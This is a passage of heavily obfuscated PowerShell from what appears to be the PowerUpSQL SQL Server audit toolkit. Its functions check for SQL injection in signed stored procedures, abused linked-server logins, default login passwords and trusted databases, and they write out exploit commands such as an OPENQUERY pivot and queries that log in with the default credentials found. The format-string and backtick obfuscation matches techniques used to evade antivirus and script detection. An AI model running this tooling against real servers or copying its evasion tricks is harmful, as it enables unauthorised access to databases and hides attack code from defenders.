        ${a`U`Thor}        = ("{6}{12}{4}{1}{5}{11}{7}{8}{10}{3}{9}{2}{0}"-f'6','erla',' 201',' NetS','Suth','nd (@','Scot','bin','d)','PI',',','_null','t ')

        
        
        
        
        
                
        
        ${SqL`iRE`S`ULTs} = &("{0}{4}{3}{2}{5}{1}"-f 'G','eSQLi','roc','-SQLStoredP','et','edur') -Instance ${inS`TA`NCe} -Username ${Use`RnAme} -Password ${paS`SWO`RD} -Credential ${CR`EdeN`TIaL} -OnlySig
        
        
        if(${sqliR`EsUL`Ts}."R`owS"."co`UnT" -ge 1){
            
            
            ${i`SVULN`ERa`BLe} = "Yes"
            ${Ise`xp`l`Oi`TaBle} = ("{0}{1}" -f'Unkno','wn')

            
            ${SQL`i`R`esulTS} |
            &("{1}{0}{2}"-f'rEach-Objec','Fo','t'){
            
                
                ${datAb`ASe`NAME} = ${_}."DAT`AB`A`seNaMe" 
                ${S`ch`emAN`AmE} = ${_}."sChemaN`A`me"
                ${Pr`oCEdurE`N`A`me} = ${_}."P`Ro`cEdURena`me"
                ${ObJ`ectNa`Me} = "$DatabaseName.$SchemaName.$ProcedureName"
                ${d`ETAiLS} =  ('The'+' '+"$ObjectName "+'store'+'d '+'p'+'rocedu'+'re'+' '+'is'+' '+'a'+'f'+'fecte'+'d.')
                
                
                ${n`UlL} = ${tBL`d`ATA}."rO`WS".("{1}{0}"-f'dd','A').Invoke(${C`o`MpUTe`RnamE}, ${INst`AnCE}, ${Vu`lNERaBi`lI`TY}, ${D`EscrIp`Ti`on}, ${remEd`I`AtI`On}, ${SEV`eRITy}, ${ISVu`ln`er`Ab`lE}, ${ISe`Xp`L`oitABLE}, ${e`xPL`oIt`ED}, ${e`xPlOi`T`cmd}, ${dE`Ta`ILS}, ${REFer`e`Nce}, ${au`THOr})        
            }
        }    

        
        
        
        if(${E`xPLo`it}){
            &("{0}{1}{2}"-f 'W','rite-Verb','ose') ("$Instance "+': '+'N'+'o '+'automat'+'i'+'c '+'e'+'xplo'+'itation'+' '+'optio'+'n '+'h'+'as '+'been'+' '+'pr'+'ovide'+'d. '+'Uninfor'+'m'+'ed '+'ex'+'pl'+'oitati'+'on '+'of'+' '+'SQ'+'Li '+'can'+' '+'h'+'ave '+'a '+'n'+'egat'+'ive '+'im'+'pact '+'on'+' '+'pr'+'o'+'duction '+'en'+'vir'+'on'+'ments.')
        }

        
        &("{2}{4}{3}{1}{0}"-f'ose','b','Wri','er','te-V') -Message ("$Instance "+': '+'COM'+'PLETE'+'D '+'VU'+'L'+'NERABI'+'LITY '+'C'+'HEC'+'K: '+'P'+'otenti'+'a'+'l '+'SQL'+' '+'I'+'nje'+'c'+'tion '+'- '+'S'+'igned '+'b'+'y '+'C'+'ert'+'ifi'+'cate '+'Lo'+'gin')
    }

    End
    {
        
        if ( -not ${n`OO`UtpUt})
        {
            Return ${t`BlDA`Ta}
        }
    }
}






Function i`NvOK`e-`s`QLauDIt`PRiVsERV`eRlinK
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNDaTory = ${FAl`SE},
                valUefRoMpipelIneBYPropeRtynaMe = ${t`RUE},
        HElPMEssagE = {"{6}{3}{10}{0}{4}{11}{5}{9}{8}{1}{7}{2}"-f 'e','t to authenticate w','.',' ','r ','oma','SQL','ith',' accoun','in','Serv','or d'})]
        [string]${u`SeRN`AMe},

        [Parameter(MAndaToRY = ${FaL`sE},
                VAlueFroMpIpelinebypropERtYNAME = ${tR`Ue},
        heLPmEsSAGE = {"{6}{1}{2}{4}{7}{0}{9}{10}{3}{5}{11}{8}" -f 'ount passw',' Se','rver or domai','ut','n','hen','SQL',' acc','icate with.','ord',' to a','t'})]
        [string]${PAS`sWO`RD},

        [Parameter(MaNDATORY = ${faL`sE},
                vALUEfRompipELiNEbYpropErtYnaME = ${tR`UE},
        HelPmessagE = {"{0}{5}{1}{2}{3}{4}" -f 'Window','crede','n','t','ials.','s '})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${crEd`E`Nt`Ial} =  $0459m2::"EMP`TY",

        [Parameter(mANdAtOry = ${faL`SE},
                valueFrOMpIpELineBYPrOpErTYNAmE = ${T`RUE},
        heLpmeSsaGE = {"{1}{4}{3}{7}{0}{5}{6}{2}" -f' in','SQL ','o.','r','Se','stance t','o connection t','ver'})]
        [string]${In`ST`A`NCE},

        [Parameter(MAnDaTORY = ${f`Alse},
        hELpMesSagE = {(("{6}{4}{2}{1}{0}{5}{3}" -f' output a','t','0}','ng.','n{','nythi','Do'))-F[CHAR]39})]
        [string]${nOO`U`TpUt},

        [Parameter(MAnDatory = ${fa`LSe},
        hELpmeSsaGE = {"{0}{3}{1}{5}{2}{4}"-f 'Expl','it','e is','o','sues.',' vulnerabl'})]
        [switch]${e`Xpl`oIT}
    )

    Begin
    {
        
        ${tBlD`A`TA} = &("{2}{0}{1}" -f'w','-Object','Ne') -TypeName ("{2}{3}{4}{0}{1}" -f'DataTa','ble','Syst','em.D','ata.')
        ${N`ULl} = ${Tb`L`dAtA}."c`OlUMNS".("{0}{1}" -f 'A','dd').Invoke(("{2}{1}{0}"-f'terName','ompu','C'))
        ${nu`ll} = ${t`BL`DATa}."C`OLum`NS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}"-f'ce','Instan'))
        ${N`UlL} = ${tb`l`dATa}."co`Lum`Ns".("{1}{0}" -f 'd','Ad').Invoke(("{0}{2}{1}" -f 'Vul','rability','ne'))
        ${Nu`ll} = ${TbL`d`ATa}."coL`UMns".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{2}" -f'es','D','cription'))
        ${nu`Ll} = ${TBl`dA`TA}."Co`LumNs".("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{3}{0}" -f'ion','ia','Remed','t'))
        ${Nu`Ll} = ${tbL`DA`TA}."C`Ol`UMnS".("{0}{1}"-f'Ad','d').Invoke(("{1}{0}{2}" -f'v','Se','erity'))
        ${N`ULl} = ${t`B`ldatA}."c`OLUM`Ns".("{0}{1}" -f 'A','dd').Invoke(("{3}{0}{1}{2}"-f 'sVul','nerabl','e','I'))
        ${nU`LL} = ${tbL`D`Ata}."cOLU`mnS".("{1}{0}"-f 'dd','A').Invoke(("{0}{3}{1}{2}" -f'I','loitab','le','sExp'))
        ${nU`LL} = ${tb`l`datA}."C`OlUm`NS".("{1}{0}"-f 'dd','A').Invoke(("{3}{1}{2}{0}" -f'ited','l','o','Exp'))
        ${Nu`LL} = ${TbL`d`Ata}."c`oLUM`Ns".("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}" -f'md','oitC','Expl'))
        ${NU`ll} = ${t`BlD`ATa}."COL`UMNS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}"-f 'Det','ails'))
        ${N`ULL} = ${TBld`A`TA}."CO`lu`MNs".("{0}{1}" -f'Ad','d').Invoke(("{0}{1}"-f'Refer','ence'))
        ${n`UlL} = ${tBl`D`ATA}."coLu`MNs".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}" -f'Aut','ho','r'))
    }

    Process
    {
        
        &("{0}{3}{2}{1}" -f 'Writ','e','Verbos','e-') -Message ("$Instance "+': '+'START'+' '+'VULNE'+'RABI'+'LI'+'TY'+' '+'CHE'+'CK'+': '+'Excess'+'iv'+'e'+' '+'Pr'+'ivi'+'lege '+'- '+'S'+'er'+'ver '+'Lin'+'k')

        
        ${teSt`CO`NnE`cti`on} = &("{0}{5}{3}{4}{2}{1}{6}" -f 'Get','ecti','n','C','on','-SQL','onTest') -Instance ${in`sTA`NCe} -Username ${USER`N`AMe} -Password ${pa`SsWo`Rd} -Credential ${crED`E`NTi`AL} -SuppressVerbose | &("{1}{2}{0}" -f 'e-Object','Whe','r') -FilterScript {
            ${_}."s`TAT`US" -eq ("{0}{2}{1}" -f 'Ac','le','cessib')
        }
        if(-not ${TES`Tco`NnecTiOn})
        {
            
            &("{2}{0}{1}" -f'ite-Verbo','se','Wr') -Message ("$Instance "+': '+'CO'+'N'+'NECTION '+'FAI'+'LED'+'.')
            &("{0}{1}{2}{4}{3}"-f 'Wr','ite','-V','e','erbos') -Message ("$Instance "+': '+'COMPL'+'ETED'+' '+'VULNER'+'ABI'+'LI'+'TY '+'CH'+'ECK:'+' '+'E'+'xce'+'ssiv'+'e '+'Pr'+'i'+'v'+'ilege '+'- '+'Se'+'rver'+' '+'L'+'ink.')
            Return
        }
        else
        {
            &("{2}{1}{0}" -f'e','ite-Verbos','Wr') -Message ("$Instance "+': '+'C'+'O'+'NNECT'+'ION '+'S'+'UCCES'+'S.')
        }

        
        ${seR`Veri`NfO} = &("{4}{0}{5}{3}{1}{2}"-f't-SQ','rI','nfo','erve','Ge','LS') -Instance ${ins`T`ANCe} -Username ${U`SERN`AME} -Password ${pA`SswO`RD} -Credential ${C`RED`enTi`AL} -SuppressVerbose
        ${CURR`enTl`Og`in} = ${S`erVEr`In`FO}."CUr`R`ENTloGIN"
        ${coMputErn`A`ME} = ${SerVeR`in`Fo}."C`ompuT`Ern`AMe"

        
        
        
        if(${exP`l`Oit})
        {
            ${t`Est`ModE}  = ("{1}{0}{2}"-f 'ploi','Ex','t')
        }
        else
        {
            ${TE`stm`oDe}  = ("{0}{1}"-f'Audi','t')
        }
        ${Vu`LnE`Ra`BIL`iTY} = ("{5}{4}{8}{2}{6}{7}{3}{9}{0}{10}{1}" -f 'd ','ver',' Pri',' - ','xcess','E','vile','ge','ive','Linke','Ser')
        ${dEScR`I`PTION}   = ("{29}{0}{26}{21}{25}{18}{10}{31}{8}{13}{23}{19}{15}{2}{14}{6}{30}{20}{32}{9}{16}{7}{1}{17}{28}{33}{11}{4}{24}{22}{5}{12}{3}{27}" -f' lin','st priv','ative','ser','cal','emot','dential','allow a lea','w','l','r','s','e ','i',' cre','tern','d ','ileg',' is p','al','ch c','ed ','leges on a r','th ','ate their privi','servers','k','ver.','e login t','One or more','s whi','econfigured ','ou','o e')
        ${R`emEDia`TiON}   = ((("{9}{5}{18}{17}{10}{12}{28}{16}{20}{24}{8}{1}{23}{6}{22}{27}{0}{14}{7}{19}{21}{2}{25}{11}{13}{26}{15}{4}{3}"-f 'o','o','ur','.','t','e SQL Serv','rs using','Cl','em','Configur','l','security','i',' ','ginw','ontex',' ','r ','e','s','connec',' c',' th','te serve','t to r','rent ','c','e l','nks to'))-rePlACE 'wCl',[cHAr]39)
        ${SeV`E`RITY}      = ("{1}{0}" -f'ium','Med')
        ${IS`V`UlNEr`ABLe}  = 'No'
        ${i`S`eXPLOITab`lE} = 'No'
        ${EXP`LoIt`eD}     = 'No'
        ${Ex`Pl`oiTCmd}    = ("{0}{5}{3}{9}{6}{10}{7}{8}{2}{4}{1}"-f 'T',' time.','e ','er','at this','h',' is n','ploit availab','l','e','ot ex')
        if(${U`s`ERnaMe})
        {
            
        }
        else
        {
            
        }
        ${DET`AILs}       = ''
        ${Re`FeREn`ce}     = ("{5}{9}{1}{3}{0}{4}{10}{2}{6}{7}{8}" -f 'sdn.microsoft.com','ps:','/ms190','//m','/en','ht','47','9.asp','x','t','-us/library')
        ${aU`TH`oR}        = (("{1}{6}{3}{5}{8}{0}{11}{4}{2}{7}{9}{10}"-f'lan','Sco','ind), Ne',' S','b','uth','tt','tSP','er','I 201','6','d (@_null'))

        
        
        
        

        
        ${Li`N`KEds`ErVE`Rs} = &("{1}{0}{3}{4}{2}"-f'e','G','ink','t-SQL','ServerL') -Verbose -Instance ${i`Nsta`Nce} -Username ${us`er`NAmE} -Password ${PAsSWO`Rd} -Credential ${CrE`DeN`Ti`Al} -SuppressVerbose | 
        &("{1}{3}{0}{2}"-f 'bjec','Whe','t','re-O') { ${_}."LOcaL`lOG`iN" -ne ("{0}{3}{2}{1}"-f 'Us','dentials','elf Cre','es S') -and ([string]${_}."Rem`ot`eLOgiNna`me")."lEn`GtH" -ge 1}

        
        if(${l`i`Nkeds`eRveRs})
        {
            ${isVuln`eR`A`BLE}  = 'Yes'
            ${lin`K`eDserve`Rs} |
            &("{4}{3}{1}{2}{0}"-f'Object','Each','-','or','F') -Process {
                ${det`AiLS} = 
                ${l`iNKNaME} = ${_}."DA`T`A`BaSelInkName"
                ${LI`N`kusEr} = ${_}."REMot`E`Logi`NnAME"
                ${Lin`Kac`c`ess} = ${_}."iS_dAt`A_aCces`S_ENA`B`led"
                ${E`xPL`OItCmd} = ('E'+'xamp'+'le '+'query'+': '+'SEL'+'E'+'CT '+'* '+'FROM'+' '+"OPENQUERY([$LinkName],'Select "+('D'+'ZsDZs'+'Ser'+'v'+'er: ')."R`e`plAcE"(([chAR]68+[chAR]90+[chAR]115),[String][chAR]39)+(('hR'+'rh'+'Rr ')  -CrEPLace 'hRr',[ChAR]39)+'+ '+'@@'+'Ser'+'vern'+'ame '+('+6ol'+'6o'+'l ')."REp`L`ACE"(([cHAr]54+[cHAr]111+[cHAr]108),[StRING][cHAr]39)+(('ZMtZM'+'t ') -RePLAce  'ZMt',[char]39)+'+ '+('BF'+'0BF'+'0L'+'o'+'gin: ')."R`E`pLaCE"(([cHar]66+[cHar]70+[cHar]48),[StRiNg][cHar]39)+('f'+'O'+'1fO1 ')."ReP`La`cE"('fO1',[stRInG][cHAR]39)+'+ '+('SYST'+'E'+'M_USE'+'RT6E)')."RePL`A`ce"(([chAR]84+[chAR]54+[chAR]69),[stRiNG][chAR]39))

                if(${lIN`KuS`ER} -and ${L`INk`A`CcESs} -eq ("{1}{0}" -f 'ue','Tr'))
                {
                    &("{2}{0}{1}{3}"-f 'ri','te-V','W','erbose') -Message ("$Instance "+': '+'- '+'Th'+'e '+"$LinkName "+'linked'+' '+'se'+'rver'+' '+'was'+' '+'foun'+'d '+'c'+'o'+'nfigured '+'wi'+'th '+'th'+'e '+"$LinkUser "+'logi'+'n.')
                    ${dE`Ta`ILS} = ('T'+'he '+'S'+'QL '+'Serv'+'e'+'r '+'li'+'nk '+"$LinkName "+'w'+'as '+'fou'+'nd '+'config'+'u'+'red '+'wit'+'h '+'t'+'he '+"$LinkUser "+'logi'+'n.')
                    ${nU`lL} = ${TB`ld`AtA}."RO`ws".("{0}{1}"-f'A','dd').Invoke(${cOmPUT`ER`NaMe}, ${Ins`TA`N`ce}, ${V`ULne`RABIl`itY}, ${DEsc`Ri`P`TIon}, ${reMed`i`ATion}, ${Se`V`eRiTy}, ${I`S`VULNE`RAblE}, ${IseXPlO`i`TA`Ble}, ${eXPL`oIt`ed}, ${eXpl`OItC`mD}, ${D`Etai`ls}, ${RefE`R`EnCe}, ${au`THOr})
                }
            }
        }
        else
        {
            &("{1}{3}{0}{2}"-f's','Writ','e','e-Verbo') -Message ("$Instance "+': '+'- '+'N'+'o '+'expl'+'oitab'+'le '+'SQL'+' '+'S'+'erver '+'lin'+'ks '+'we'+'re '+'f'+'oun'+'d.')
        }

        
        
        
        
        
        


        
        
        
        
        
        
        


        
        &("{1}{0}{3}{2}"-f'r','W','Verbose','ite-') -Message ("$Instance "+': '+'CO'+'MPL'+'ETED '+'VULN'+'ERA'+'BILI'+'TY '+'CH'+'EC'+'K: '+'Ex'+'cessi'+'ve '+'P'+'rivi'+'lege '+'- '+'Se'+'rver '+'Lin'+'k')
    }

    End
    {
        
        if ( -not ${No`ouTp`UT})
        {
            Return ${T`BlDATA}
        }
    }
}







Function  INvOkE`-sqlauD`Itd`efaulTlogI`NPW
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANDaTORY = ${FaL`SE},
                VaLUeFRoMPiPELiNEbyPrOpeRtynamE = ${TR`Ue},
        HeLpMeSSage = {"{0}{7}{11}{10}{6}{5}{1}{3}{4}{8}{2}{9}" -f'S','nt to a','nticate ','ut','h','ccou','n a','QL Se','e','with.','r or domai','rve'})]
        [string]${userN`A`Me},

        [Parameter(MAndatORy = ${f`A`lSe},
                vAlueFrOmpIPeLiNEBYPROPeRtynaMe = ${Tr`Ue},
        hELPmeSsAgE = {"{4}{3}{13}{12}{0}{2}{9}{1}{7}{5}{6}{8}{11}{10}"-f' domain ','t ','acc','Ser','SQL ','ord to authe','nt','passw','ic','oun',' with.','ate','er or','v'})]
        [string]${pA`ss`WorD},

        [Parameter(MANDatORY = ${F`AL`Se},
                vaLUEfROMPIPElineByPRoPerTyNAmE = ${TR`UE},
        helpMEssaGe = {"{2}{1}{0}{3}{4}" -f'e',' cred','Windows','nti','als.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cR`EDENT`IaL} =  $0459m2::"EmP`Ty",

        [Parameter(mANDATory = ${f`AlSe},
                vALUeFROmpiPelInebyPrOPertYNamE = ${tR`UE},
        HElPMEsSAge = {"{1}{8}{0}{2}{7}{5}{3}{4}{6}" -f's','SQL S','t','e t','o connection to','c','.','an','erver in'})]
        [string]${iNSt`A`Nce},

        [Parameter(MANDATorY = ${fAl`sE},
        helpmEsSaGe = {(("{5}{2}{1}{0}{3}{4}"-f't ','zt outpu','onwZ','anything','.','D'))."R`EpLaCE"('wZz',[StrINg][ChaR]39)})]
        [string]${nOoU`T`PUT},

        [Parameter(maNdAtorY = ${fal`SE},
        hElpmEssAGe = {"{3}{0}{1}{2}{4}"-f'xploit vulne','ra','ble issue','E','s.'})]
        [switch]${e`xPlO`it}
    )

    Begin
    {
        
        ${Tbl`D`AtA} = &("{1}{0}{2}"-f'c','New-Obje','t') -TypeName ("{2}{4}{5}{0}{3}{1}"-f'Data','DataTable','Sys','.','t','em.')
        ${n`ULl} = ${Tbl`Da`Ta}."CoLu`m`Ns".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}"-f 'me','Co','mputerNa'))
        ${N`UlL} = ${t`BLda`Ta}."CO`LuM`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{1}"-f 'stan','ce','In'))
        ${n`Ull} = ${tBLd`A`TA}."c`oL`UMns".("{1}{0}"-f 'dd','A').Invoke(("{4}{2}{3}{0}{1}"-f 'bilit','y','u','lnera','V'))
        ${nu`lL} = ${TBl`dAta}."c`oLUMNS".("{1}{0}"-f 'd','Ad').Invoke(("{2}{0}{1}" -f 'c','ription','Des'))
        ${nu`ll} = ${T`BlDatA}."cOl`UMNs".("{1}{0}"-f 'dd','A').Invoke(("{3}{0}{1}{2}"-f'ia','tio','n','Remed'))
        ${n`Ull} = ${Tb`lD`Ata}."Colum`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{0}" -f 'erity','ev','S'))
        ${nu`Ll} = ${t`BlDA`Ta}."co`l`UMnS".("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}"-f'rable','ne','IsVul'))
        ${N`ULl} = ${TblDA`TA}."COlu`MNs".("{0}{1}" -f 'A','dd').Invoke(("{3}{0}{1}{2}" -f'oi','tab','le','IsExpl'))
        ${N`ULl} = ${t`B`ldaTa}."c`olUMnS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{2}"-f'xpl','E','oited'))
        ${n`Ull} = ${TbL`d`AtA}."coL`Um`Ns".("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}" -f 'd','Expl','oitCm'))
        ${N`ULl} = ${TB`LD`ATA}."Co`LuMNs".("{1}{0}" -f'dd','A').Invoke(("{1}{0}" -f's','Detail'))
        ${N`Ull} = ${Tbl`D`ATA}."CO`Lu`MNS".("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}" -f'e','Re','ferenc'))
        ${nu`LL} = ${tbL`da`Ta}."Co`l`Umns".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}{2}" -f 'h','Aut','or'))
    }

    Process
    {
        
        &("{0}{2}{3}{1}"-f 'Wri','e','te-','Verbos') -Message ("$Instance "+': '+'STA'+'RT '+'VU'+'LNER'+'ABI'+'LITY '+'CHEC'+'K: '+'Defaul'+'t'+' '+'SQ'+'L '+'S'+'erve'+'r '+'Login'+' '+'P'+'asswor'+'d')

        
        ${Se`Rv`Er`INfO} = &("{3}{4}{2}{0}{1}"-f'ver','Info','r','Get','-SQLSe') -Instance ${i`NSTa`NCE} -Username ${us`E`RnAme} -Password ${PA`ssWO`RD} -Credential ${C`R`EDe`NtiAL} -SuppressVerbose
        ${Cur`RENTLoG`IN} = ${Se`R`VeRInFO}."cURrEntl`O`giN"
        ${cOMPU`TEr`NAMe} = ${SERv`eRi`NfO}."C`OM`pUTeR`NAme"

        
        
        
        if(${EXp`Lo`IT})
        {
            ${tEs`Tmode}  = ("{1}{0}" -f't','Exploi')
        }
        else
        {
            ${TESTm`O`dE}  = ("{1}{0}" -f 'dit','Au')
        }
        ${v`ULnErA`BILi`TY} = ("{1}{2}{4}{8}{7}{9}{5}{0}{3}{10}{6}" -f'n Pas','Defau','lt','s',' ','Logi','rd',' Server','SQL',' ','wo')
        ${Des`cRIptI`ON}   = ("{7}{29}{20}{2}{22}{10}{25}{3}{12}{28}{26}{17}{21}{23}{0}{18}{30}{8}{16}{24}{27}{15}{1}{6}{4}{13}{14}{19}{9}{11}{5}"-f're','sword used by a ','t ',' i','m','ion.','com','The','ault SQ','lic',' S','at','nst','on ','a','as','L ','ce','d wit','pp','targe',' is conf','SQL','igu','login ','erver','n','and p','a',' ','h a def')
        ${REMe`d`IATION}   = ("{20}{1}{13}{3}{19}{10}{9}{22}{12}{4}{7}{5}{17}{2}{15}{11}{0}{8}{16}{14}{21}{18}{6}"-f' the O','sure all S','. C',' Server l','tro','ass','cy.','ng p','S','re requ','s a','ing',' to use a s','QL','word','onsider inherit',' pass','word','poli','ogin','En',' ','ired')
        ${sev`e`Ri`TY}      = ("{0}{1}"-f'H','igh')
        ${iSv`ULNer`AblE}  = 'No'
        ${ISEXp`lOi`TABlE} = 'No'
        ${e`Xp`lOiTEd}     = 'No'
        ${Ex`pL`OItC`MD}    = ('Get-S'+'QLQ'+'u'+'ery'+' '+'-Verbo'+'s'+'e '+'-Instan'+'ce'+' '+"$Instance "+'-Q'+' '+"`"Select "+"@@Version`" "+'-Us'+'ernam'+'e '+'test'+' '+'-Pas'+'s'+'w'+'ord '+'t'+'est.')
        ${dETa`i`lS}       = ''
        ${REfE`R`eN`CE}     = ("{3}{9}{18}{1}{5}{11}{21}{4}{14}{19}{16}{6}{7}{13}{12}{20}{15}{17}{10}{2}{8}{0}" -f 'd','c','l.','h','iki/pw','o','h','u','m','ttps:','mssq','m/pwn','ma','b.io/blob/','n','/db','i.git','/','//github.','wik','ster/tech','w')
        ${auTH`OR}        = ("{2}{1}{7}{3}{5}{6}{4}{0}"-f'016','t S','Scot','d (@_nullb','SPI 2','ind), N','et','utherlan')

        
        ${R`ESUL`TS} = &("{4}{1}{3}{2}{0}" -f 'aultPw','rverL','nDef','ogi','Get-SQLSe') -Verbose -Instance ${inSt`AN`Ce} 

        if(${Re`SU`ltS}){
            ${ISVul`N`ERa`BlE} = "Yes"
            ${iseXPlO`It`A`B`Le} = "Yes"
        }

        
        ${reSuL`TS} | 
        &("{1}{0}{2}" -f 'rEach','Fo','-Object') {
            ${De`F`Ault`coMPu`TeR} = ${_}."C`o`MpUteR"
            ${de`FAU`lt`Ins`TaNcE} = ${_}."i`NS`TaNCE"
            ${dEF`AulTuS`e`R`NaME} = ${_}."U`seR`Name"
            ${DE`FAU`lTpa`ss`woRd} = ${_}."pa`S`SWOrd"
            ${Def`A`U`LTIs`SYsA`dmIn} = ${_}."issy`SAd`mIN"

            
            
            
            ${Deta`ils} = ('Defa'+'ul'+'t '+'cr'+'edent'+'ial'+'s '+'foun'+'d: '+"$DefaultUsername "+'/ '+"$DefaultPassword "+'(sy'+'s'+'admin:'+' '+"$DefaultIsSysadmin).")
            ${Exp`L`OI`TcMD}    = ('G'+'et-'+'SQL'+'Query '+'-V'+'er'+'bose '+'-Instan'+'c'+'e '+"$DefaultInstance "+'-Q'+' '+"`"Select "+"@@Version`" "+'-'+'Username'+' '+"$DefaultUsername "+'-'+'Pa'+'ssword '+"$DefaultPassword")
            ${N`Ull} = ${T`Bl`dAtA}."RO`ws".("{0}{1}" -f'Ad','d').Invoke(${dEF`A`U`L`TcOmPutER}, ${D`ef`AulTiNst`A`Nce}, ${VuLNeRa`BI`LITy}, ${d`eS`cr`IPTIon}, ${remEd`ia`TIOn}, ${Se`V`ErITy}, ${isvulN`ERa`B`le}, ${I`sexp`L`OiTABLe}, ${e`X`ploited}, ${EX`Pl`OItcmD}, ${d`etaI`LS}, ${rEF`eRen`Ce}, ${a`UthOr})                        
        }        
        
        
        &("{3}{2}{0}{1}" -f'-Verbos','e','ite','Wr') -Message ("$Instance "+': '+'COMPLE'+'TED'+' '+'VUL'+'N'+'ERAB'+'ILITY '+'CHECK'+': '+'Def'+'aul'+'t '+'SQL'+' '+'S'+'erv'+'er '+'Lo'+'gin '+'Pa'+'sswor'+'d')
    }
    End
    {           
        
        if ( -not ${NO`oU`TpUT})
        {
            Return ${tBL`D`ATA}
        }
    }
}






Function iNvo`KE-SQ`L`Au`d`iTpriVTRuStWorthY
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAnDATOry = ${fal`se},
                ValuefROMPipeLINEbYPRoPErTyName = ${t`RUe},
        HelpmESsagE = {"{9}{0}{11}{2}{4}{10}{1}{3}{5}{7}{8}{12}{6}" -f'L S','acc',' ','ou','or doma','nt to','.',' auth','entica','SQ','in ','erver','te with'})]
        [string]${US`ERNa`ME},

        [Parameter(mANDaTOrY = ${F`ALSE},
                VALuEfROmpIpElINEbypRopERtYname = ${T`RuE},
        hElPMESsAGE = {"{5}{2}{1}{0}{6}{9}{12}{4}{3}{10}{13}{8}{14}{11}{7}" -f'o','ver ','L Ser','pa','t ','SQ','r domain','te with.','o au',' acco','sswo','hentica','un','rd t','t'})]
        [string]${PaSSw`O`RD},

        [Parameter(mAnDatORY = ${Fal`sE},
                VAlUEfromPipElInebyPRoPeRTYNaME = ${t`Rue},
        HelPMeSSAGe = {"{3}{4}{2}{0}{1}"-f 'ials','.','t','Window','s creden'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${crEDe`NT`iaL} =   (  geT-vArIablE  ('0'+'4'+'59m2')).vALUE::"EMP`TY",

        [Parameter(manDatOrY = ${f`AlSe},
                ValuefrOmPIpElinebyPRopeRTYnAME = ${t`RuE},
        HelPMeSsagE = {"{2}{6}{0}{3}{7}{1}{5}{4}" -f'erver ','o c','SQ','ins','on to.','onnecti','L S','tance t'})]
        [string]${iN`STAn`ce},

        [Parameter(MandatoRy = ${f`Alse},
        hELPmEsSAGE = {(("{3}{2}{0}{4}{5}{1}" -f 't','ng.','ou','DonO0Gt ','put',' anythi'))."R`EPLA`cE"(([CHar]79+[CHar]48+[CHar]71),[STRINg][CHar]39)})]
        [string]${n`oo`UtPUt},

        [Parameter(manDaTOrY = ${Fa`L`se},
        hElpMESsAGE = {"{4}{1}{2}{5}{0}{3}"-f'ss','o','i','ues.','Expl','t vulnerable i'})]
        [switch]${E`xP`loit}
    )

    Begin
    {
        
        ${tBlDA`TA} = &("{0}{1}{2}" -f 'New-Obj','ec','t') -TypeName ("{6}{5}{4}{3}{2}{0}{1}" -f'l','e','b','Ta','a.Data','tem.Dat','Sys')
        ${nu`Ll} = ${T`Bld`AtA}."c`OlUMnS".("{0}{1}"-f 'Ad','d').Invoke(("{1}{2}{0}"-f'ame','Comp','uterN'))
        ${N`ULl} = ${TB`l`DATA}."C`olumNs".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}" -f'Inst','ance'))
        ${nu`ll} = ${Tbld`A`TA}."cOl`UM`NS".("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{3}{1}"-f 'Vu','y','lnerabil','it'))
        ${N`ULl} = ${TBl`D`AtA}."cOL`UmNS".("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{3}{2}"-f'De','scrip','on','ti'))
        ${N`Ull} = ${Tb`Lda`TA}."Co`LUMns".("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{3}{2}" -f 'R','emed','ation','i'))
        ${nU`ll} = ${TBLd`ATa}."C`olu`mnS".("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{2}"-f'everit','S','y'))
        ${Nu`LL} = ${TB`L`datA}."ColUM`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{1}{2}{0}" -f'lnerable','IsV','u'))
        ${nu`lL} = ${T`BlD`AtA}."co`LumnS".("{1}{0}"-f 'dd','A').Invoke(("{0}{3}{2}{1}" -f 'I','able','t','sExploi'))
        ${nU`Ll} = ${t`BLD`ATA}."co`lu`MnS".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}"-f 'E','xplo','ited'))
        ${Nu`lL} = ${Tb`L`DaTA}."C`oL`UMnS".("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{0}"-f'oitCmd','pl','Ex'))
        ${nU`LL} = ${T`B`ldata}."col`U`mNS".("{1}{0}"-f 'dd','A').Invoke(("{1}{0}" -f 'etails','D'))
        ${n`UlL} = ${TBlD`ATa}."c`olUMns".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}"-f'Referen','c','e'))
        ${Nu`ll} = ${TBLDA`TA}."Co`LUM`NS".("{1}{0}"-f'dd','A').Invoke(("{1}{0}" -f'r','Autho'))
    }

    Process
    {
        
        &("{0}{3}{1}{2}" -f'Wri','-Verb','ose','te') -Message ("$Instance "+': '+'STAR'+'T'+' '+'V'+'ULNERAB'+'ILIT'+'Y'+' '+'CHE'+'CK: '+'E'+'xce'+'ssive'+' '+'Priv'+'il'+'ege'+' '+'- '+'Tr'+'us'+'ted '+'Dat'+'a'+'base')

        
